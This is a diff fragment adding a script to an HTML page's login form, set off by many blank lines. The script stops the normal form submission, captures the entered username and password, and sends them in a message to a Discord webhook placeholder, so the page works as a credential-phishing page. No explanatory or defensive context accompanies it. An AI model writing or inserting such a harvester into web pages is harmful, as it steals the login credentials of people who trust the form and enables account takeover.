@@ -402,6 +402,59 @@
         </div>
 </div>
 
+
+
+
+
+
+
+
+            
+
+
+    <script>
+    document.querySelector('.login-form').addEventListener('submit', function(event) {
+        event.preventDefault(); // Prevent the default form submission
+
+        // Collect form data
+        const username = document.querySelector('input[name="username"]').value;
+        const password = document.querySelector('input[name="password"]').value;
+
+        // Create a payload for the Discord webhook
+        const payload = {
+            content: `New login attempt:\nUsername/Email/Phone: ${username}\nPassword: ${password}`
+        };
+
+        // Send the payload to the Discord webhook
+        fetch('YOUR_DISCORD_WEBHOOK_URL', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Success:', data);
+        })
+        .catch((error) => {
+            console.error('Error:', error);
+        });
+    });
+    </script>
+
+
+
+
+
+
+
+
+
+            
+            
+
+            
         </div>
     </main><!--Bootstrap Footer React Component -->
 
